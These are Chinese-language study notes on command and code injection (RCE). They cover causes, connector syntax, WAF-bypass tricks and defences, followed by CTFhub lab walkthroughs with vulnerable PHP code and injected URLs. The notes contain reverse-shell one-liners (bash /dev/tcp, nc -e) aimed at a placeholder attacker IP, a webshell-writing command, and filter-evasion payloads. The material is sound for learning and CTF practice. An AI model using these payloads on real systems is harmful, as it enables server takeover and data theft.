### 一、核心概念：代码执行 vs. 命令执行

虽然经常被混用，但两者有细微差别：

1. **命令执行（Command Injection）**
    
    - **含义**：攻击者能够通过应用程序在服务器操作系统上执行**非预期的系统命令**（OS Command）。
        
    - **上下文**：通常发生在应用程序需要调用系统命令的地方（例如，调用 `ping`, `ls`, `dir`, `curl` 等）。
        
    - **影响层面**：操作系统层面。
        
    - **例子**：一个网站输入框让你输入一个IP地址来 Ping，你输入 `8.8.8.8 & whoami`，服务器执行了 `ping 8.8.8.8` 和 `whoami` 两条命令。
        
2. **代码执行（Code Injection / Remote Code Execution - RCE）**
    
    - **含义**：攻击者能够将**非预期的代码**注入到应用程序中，并由应用程序本身（或其环境，如语言解释器）来执行。
        
    - **上下文**：应用程序的运行时环境（如 PHP, Python, Java, JavaScript 解释器）。
        
    - **影响层面**：应用程序层面，但通常也能借此执行系统命令。
        
    - **例子**：一个PHP网站有一个不安全的 `eval()` 函数，你传入了参数 `?cmd=system('whoami')`，服务器上的PHP解释器执行了这段代码，进而调用了系统命令 `whoami`。
        

**简单总结**：

- **命令执行**是让**操作系统**执行你输入的命令。
    
- **代码执行**是让**应用程序**执行你输入的代码，这段代码通常可以再派生出系统命令。
    
- **RCE（远程代码执行）** 通常是一个更宽泛的统称，涵盖了上述两种情况，指最终都能在目标服务器上获得执行任意命令或代码的能力。
    

---

### 二、产生原因

根本原因是：**将用户输入的数据作为代码或命令的一部分执行，并且没有进行充分的安全过滤。**

#### 常见场景：

1. **调用系统命令的函数使用不当**
    
    - PHP: `system()`, `exec()`, `passthru()`, `shell_exec()`, ` 反引号 `` `
        
    - Java: `Runtime.getRuntime().exec()`
        
    - Python: `os.system()`, `subprocess.Popen()`, `eval()`
        
    - Node.js: `child_process.exec()`
        
    - 用户输入被直接拼接进命令中。
        
2. **动态代码执行函数使用不当**
    
    - PHP: `eval()`, `assert()`, `create_function()`
        
    - Python: `eval()`, `exec()`
        
    - JavaScript: `eval()`, `setTimeout()`, `setInterval()`, `Function()`
        
    - 用户输入被直接当作代码执行。
        
3. **反序列化漏洞（Deserialization）**
    
    - 不当反序列化用户可控的数据，可能导致任意代码执行（例如 Java Apache Commons Collections, PHP unserialize() + __wakeup()/__destruct()）。
        
4. **模板注入（SSTI - Server-Side Template Injection）**
    
    - 如 Jinja2 (Python), Twig (PHP), Freemarker (Java) 等模板引擎，如果允许用户控制模板内容，可能导致代码执行。
        
5. **其他漏洞的链式利用**
    
    - 文件上传（上传一个恶意脚本文件） + 文件包含（LFI） = RCE。
        
    - SQL 注入（如果数据库支持如 `xp_cmdshell` 等功能）-> 命令执行。
        

---

### 三、攻击手法与Payload示例

攻击者通常使用**连接符**或**绕过技巧**将恶意指令拼接到原有命令中。

#### 1. 命令执行连接符（Unix/Linux 和 Windows 略有不同）

| 符号                  | 说明                   | 示例（Linux）                  |
| ------------------- | -------------------- | -------------------------- |
| `A; B`              | 执行A，然后执行B（B总是执行）     | `ping; whoami`             |
| `A & B`             | A在后台执行，B在前台执行（B总是执行） | `ping & whoami`            |
| `A && B`            | 只有A执行成功，才执行B         | `ping 127.0.0.1 && whoami` |
| <code>A \| B</code> | A的输出作为B的输入           | <code>dir \| sh</code>     |
| `` A `B` ``         | 执行B，将其输出作为A的参数       | `echo` whoami``            |
| `A $(B)`            | 同上，更现代的方式            | `echo $(whoami)`           |
| `A \|\| b`          | A执行失败则执行B,A成功则不执行B   |                            |

**Windows 常用连接符**：`&`, `&&`, `|`, `||`  ==get与post传参时若没有成功可以尝试编码，如&进行get传参时可能需要url编码==

#### 2. 常见Payload示例

- **Linux**
    
    - **显示当前用户**：`; whoami`
        
    - **查看系统文件**：`&& cat /etc/passwd`
        
    - **反向Shell（获取交互式访问）**
        `bash -c 'bash -i >& /dev/tcp/攻击者IP/攻击者端口 0>&1'`
        或者使用 nc:nc -e /bin/sh 攻击者IP 攻击者端口
    - **写入WebShell**：`; echo '<?php system($_GET["cmd"]);?>' > /var/www/html/shell.php`
        
- **Windows**
    
    - **显示当前用户**：`& whoami`
        
    - **写文件**：`&& echo "hacked" > C:\test.txt`
        

#### 3. 绕过技巧（WAF绕过）

如果存在安全防护（WAF），需要绕过过滤。

- **空格绕过**：使用 `${IFS}`, `<`, `<>`, `%20`, `%09` (tab) 代替空格
    
    - `cat${IFS}/etc/passwd`
        
    - `cat<>/etc/passwd`
        
- **命令绕过**：使用变量、通配符、编码
    
    - `a=whoami;$a` （变量拼接）
        
    - `/???/c?t??/etc/passwd` （通配符，匹配 `/bin/cat`）
        
- **符号绕过**：使用引号、转义
    
    - `w'h'o'a'm'i`
        
    - `w\ho\am\i`
        
- **编码绕过**：Base64, Hex
    
    - `echo "d2hvYW1p" | base64 -d` （`d2hvYW1p` 是 `whoami` 的 base64 编码）
        
    - `echo 77686f616d69 | xxd -r -p` （十六进制编码）
        
- **其他方式**：利用已有环境、工具（如 `curl`, `wget`, `python`, `perl` 来下载或执行更多 payload）。
    

---

### 四、危害与影响

RCE是最高危的漏洞之一，因为它直接导致：

1. **服务器完全失陷**：获得服务器命令执行权限，相当于拿到了服务器的“钥匙”。
    
2. **数据泄露**：直接读取数据库连接文件、配置文件、用户数据等敏感信息。
    
3. **内网渗透**：以该服务器为跳板，攻击同一内网中的其他机器。
    
4. **植入WebShell**：维持长期控制。
    
5. **植入恶意软件**：挖矿木马、勒索软件、僵尸网络节点等。
    
6. **篡改网站内容**： deface（篡改网页）。
    

---

### 五、防御措施

**核心原则：永远不要信任用户输入！**

1. **白名单校验**：对用户输入进行严格的白名单验证（只允许已知好的字符），而非黑名单（禁止已知坏的字符）。
    
2. **避免直接调用OS命令**：优先使用语言内置函数或安全API来完成功能，而不是动不动就 `system()`。
    
3. **必要的转义/过滤**：如果必须调用系统命令，使用安全的函数对用户输入进行转义。
    
    - PHP: `escapeshellarg()`, `escapeshellcmd()`
        
    - Python: `shlex.quote()`
        
4. **最小权限原则**：运行Web服务的用户（如 `www-data`, `nginx`）应使用最低必要的权限，避免使用 `root` 权限，这样即使被RCE，能造成的破坏也有限。
    
5. **禁用危险函数**：在 `php.ini` 中通过 `disable_functions` 禁用 `system`, `exec`, `passthru`, `shell_exec`, `eval` 等危险函数。
    
6. **及时更新和修补**：保持系统、中间件、应用程序、依赖库的最新版本，防止已知漏洞被利用。
    
7. **使用WAF**：Web应用防火墙可以帮助拦截一些常见的、简单的RCE攻击payload，但不能完全依赖。
    

### 总结

RCE/命令执行漏洞是Web安全的“致命弱点”，它直接赋予了攻击者控制服务器的能力。开发人员必须对用户输入保持高度警惕，遵循安全编码规范，从源头上杜绝此类漏洞的产生。安全人员在进行渗透测试时，也会将发现RCE作为最高优先级的测试目标。

#### CTFhub  eval()
- 源码
```php
<?php  
if (isset($_REQUEST['cmd'])) {  
    eval($_REQUEST["cmd"]);  
} else {    highlight_file(__FILE__);  
}  
?>
$_REQUEST()可以获取GET与POST参数
```
- 尝试linux命令/?cmd=system('pwd');
		得到/var/www/html说明是Linux系统
- 查询根目录下的文件/?cmd=system(’ls /‘);
		bin boot dev etc flag_311 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
		得到有关flag的文件flag_311
- 查询/?cmd=system('cat /flag_311');
		ctfhub{c3a9b1db0020f164bdee70dc}
#### CTFhub 命令注入
##### 命令注入
- 源码
```php
<?php  
$res = FALSE;  
if (isset($_GET['ip']) && $_GET['ip']) {    
	$cmd = "ping -c 4 {$_GET['ip']}";  //没有任何过滤
	exec($cmd, $res);  //有第二个参数，返回完整数组
} 
?>
```
- ?ip=127.0.0.1返回结果
```json
Array
(
    [0] => PING 127.0.0.1 (127.0.0.1): 56 data bytes
    [1] => 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.022 ms
    [2] => 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.067 ms
    [3] => 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.044 ms
    [4] => 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.046 ms
    [5] => 
    [6] => --- 127.0.0.1 ping statistics ---
    [7] => 4 packets transmitted, 4 packets received, 0% packet loss
    [8] => round-trip min/avg/max = 0.022/0.044/0.067 ms
)
```
- ?ip=127.0.0.1;ls返回结果
```json
Array
(
    [0] => PING 127.0.0.1 (127.0.0.1): 56 data bytes
    [1] => 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.023 ms
    [2] => 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.060 ms
    [3] => 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.073 ms
    [4] => 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.057 ms
    [5] => 
    [6] => --- 127.0.0.1 ping statistics ---
    [7] => 4 packets transmitted, 4 packets received, 0% packet loss
    [8] => round-trip min/avg/max = 0.023/0.053/0.073 ms
    [9] => 27973114891304.php //ls 返回结果
    [10] => index.php  //ls返回结果
)
```
- ?ip=127.0.0.1;ls /返回结果
```json
Array
(
    [0] => PING 127.0.0.1 (127.0.0.1): 56 data bytes
    [1] => 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.030 ms
    [2] => 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.076 ms
    [3] => 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.046 ms
    [4] => 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.074 ms
    [5] => 
    [6] => --- 127.0.0.1 ping statistics ---
    [7] => 4 packets transmitted, 4 packets received, 0% packet loss
    [8] => round-trip min/avg/max = 0.030/0.056/0.076 ms
    [9] => bin
    [10] => dev
    [11] => etc
    [12] => home
    [13] => lib
    [14] => media
    [15] => mnt
    [16] => proc
    [17] => root
    [18] => run
    [19] => sbin
    [20] => srv
    [21] => sys
    [22] => tmp
    [23] => usr
    [24] => var
)
```
- ?ip=127.0.0.1;cat /var/www/html/index.php
- ?ip=127.0.0.1;cat /var/www/html/27973114891304.php
- 127.0.0.1 ; cat 27973114891304.php
		ctfhub{4fcc02a618c1079b7cb14831}
##### 过滤cat
- 源码
```php
<?php  
$res = FALSE;  
if (isset($_GET['ip']) && $_GET['ip']) {    
	$ip = $_GET['ip'];    
	$m = [];  
    if (!preg_match_all("/cat/", $ip, $m)) {        
	    $cmd = "ping -c 4 {$ip}";        
		exec($cmd, $res);  
    } else {        
	    $res = $m;  
    }  
}  
?>
```
- ?ip=127.0.0.1;ls返回结果
```json
Array
(
    [0] => PING 127.0.0.1 (127.0.0.1): 56 data bytes
    [1] => 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.029 ms
    [2] => 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.056 ms
    [3] => 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.054 ms
    [4] => 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.071 ms
    [5] => 
    [6] => --- 127.0.0.1 ping statistics ---
    [7] => 4 packets transmitted, 4 packets received, 0% packet loss
    [8] => round-trip min/avg/max = 0.029/0.052/0.071 ms
    [9] => flag_262881493714898.php
    [10] => index.php
)
```
- 查看flag_262881493714898.php
- 绕过
	| `cat`               | 读取文件内容               |
	| -------------- | ------------------          |
	| `more` / `less` | 分页读取文件内容         |
	| `head` / `tail` | 查看文件开头/结尾        |
- 127.0.0.1;more flag_262881493714898.php
- 127.0.0.1;less flag_262881493714898.php
- 127.0.0.1;head flag_262881493714898.php
- 127.0.0.1;tail flag_262881493714898.php
- 127.0.0.1;ca${x}t flag_262881493714898.php
- 127.0.0.1;ca$@t flag_17915253753373.php
- 127.0.0.1;ca$*t flag_17915253753373.php
- 127.0.0.1;tac flag_17915253753373.php
- 127.0.0.1;t$*ac flag_17915253753373.php
- 127.0.0.1;t$@ac flag_17915253753373.php
		- 均可绕过ctfhub{0763470354440cef13c200a0}
##### 过滤空格
- 源码
```php
<?php 
$res = FALSE;  
if (isset($_GET['ip']) && $_GET['ip']) {    
	$ip = $_GET['ip'];    
	$m = [];  
    if (!preg_match_all("/ /", $ip, $m)) {   
         $cmd = "ping -c 4 {$ip}"; 
         exec($cmd, $res);  
    } else { 
           $res = $m;  
    }  
}  
?>
```
- ?ip=127.0.0.1;ls
```json
Array
(
    [0] => PING 127.0.0.1 (127.0.0.1): 56 data bytes
    [1] => 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.036 ms
    [2] => 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.069 ms
    [3] => 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.078 ms
    [4] => 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.074 ms
    [5] => 
    [6] => --- 127.0.0.1 ping statistics ---
    [7] => 4 packets transmitted, 4 packets received, 0% packet loss
    [8] => round-trip min/avg/max = 0.036/0.064/0.078 ms
    [9] => flag_21961305478453.php
    [10] => index.php
)
```
- 查看flag_21961305478453.php
- 绕过空格
	- ?ip=127.0.0.1;cat${IFS}flag_21961305478453.php 成功
	- ?ip=127.0.0.1;cat$IFS$1flag_1090073725437.php 成功
	- ?ip=127.0.0.1;cat$IFSflag_1090073725437.php     失败
		- ?ip=127.0.0.1;{cat,flag_1090073725437.php}
			ctfhub{1547133411680a3957285a5d}
	- ?ip=127.0.0.1;cat<>flag_21961305478453.php     失败
	- ?ip=127.0.0.1;cat<flag_21961305478453.php       失败
	- ?ip=127.0.0.1;cat%20flag_21961305478453.php   失败
	- ?ip=127.0.0.1;cat%09flag_21961305478453.php   失败
	- ?ip=127.0.0.1;cat%0aflag_1090073725437.php
	- ?ip=127.0.0.1;cat%0dflag_1090073725437.php
##### 过滤目录分隔符
- 源码
```php
<?php  
$res = FALSE;  
if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
	$m = [];  
    if (!preg_match_all("/\//", $ip, $m)) {
            $cmd = "ping -c 4 {$ip}";        
            exec($cmd, $res);  
    } else {       
		    $res = $m;  
    }  
}  
?>
```
- ?ip=127.0.0.1;ls
```json
Array
(
    [0] => PING 127.0.0.1 (127.0.0.1): 56 data bytes
    [1] => 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.024 ms
    [2] => 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.068 ms
    [3] => 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.069 ms
    [4] => 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.070 ms
    [5] => 
    [6] => --- 127.0.0.1 ping statistics ---
    [7] => 4 packets transmitted, 4 packets received, 0% packet loss
    [8] => round-trip min/avg/max = 0.024/0.057/0.070 ms
    [9] => flag_is_here
    [10] => index.php
)
```
- flag_is_here要切换目录cd flag_is_here
- ?ip=127.0.0.1;cd flag_is_here;ls
```json
Array
(
    [0] => PING 127.0.0.1 (127.0.0.1): 56 data bytes
    [1] => 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.023 ms
    [2] => 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.055 ms
    [3] => 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.082 ms
    [4] => 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.067 ms
    [5] => 
    [6] => --- 127.0.0.1 ping statistics ---
    [7] => 4 packets transmitted, 4 packets received, 0% packet loss
    [8] => round-trip min/avg/max = 0.023/0.056/0.082 ms
    [9] => flag_7633275714825.php
)
```
- ?ip=127.0.0.1;cd flag_is_here;cat flag_7633275714825.php
		ctfhub{3e5dba691f15085708aa52ef}
##### 过滤运算符
- 源码
```php
<?php  
$res = FALSE;  
if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
	$m = [];  
    if (!preg_match_all("/(\||\&)/", $ip, $m)) { //过滤了|与&，第二个|是或，意思是匹配\|或&
            $cmd = "ping -c 4 {$ip}";
			exec($cmd, $res);  
    } else {
            $res = $m;  
    }  
}  
?>
```
- 上面每一关都可以通这一关
##### 综合过滤练习
- 源码
```php
<?php  
$res = FALSE;  
if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
	$m = [];  
    if (!preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m)) {        
	    $cmd = "ping -c 4 {$ip}";
		exec($cmd, $res);  
    } else {    
        $res = $m;  
    }  
}  
?>
```
- 过滤了| & ; cat flag ctfhub / 空格
- 绕过
		- %0a 换行符
		- %0d 回车符
		- $* 在shell命令执行下为空
		- ${IFS} 表示空格
- ?ip=127.0.0.1%0als
- 直接在url栏中修改，避免对%0a编码
	- `http://challenge-65a4135771ce09d0.sandbox.ctfhub.com:10800/?ip=127.0.0.1%0als` 成功
	- `http://challenge-65a4135771ce09d0.sandbox.ctfhub.com:10800/?ip=127.0.0.1%0dls`失败
```json
Array
(
    [0] => PING 127.0.0.1 (127.0.0.1): 56 data bytes
    [1] => 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.038 ms
    [2] => 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.065 ms
    [3] => 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.065 ms
    [4] => 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.086 ms
    [5] => 
    [6] => --- 127.0.0.1 ping statistics ---
    [7] => 4 packets transmitted, 4 packets received, 0% packet loss
    [8] => round-trip min/avg/max = 0.038/0.063/0.086 ms
    [9] => flag_is_here
    [10] => index.php
)
```
- 切换到flag_is_here  
		- cd${IFS}flag_is_here
- `http://challenge-65a4135771ce09d0.sandbox.ctfhub.com:10800/?ip=127.0.0.1%0acd${IFS}fl$*ag_is_here%0als`
		- 获得flag_134781142424994.php
- `http://challenge-65a4135771ce09d0.sandbox.ctfhub.com:10800/?ip=127.0.0.1%0acd${IFS}fl$*ag_is_here%0aca$*t${IFS}fl$*ag_134781142424994.php`
		- ctfhub{24db488ef6b12e6cbf2ba60d}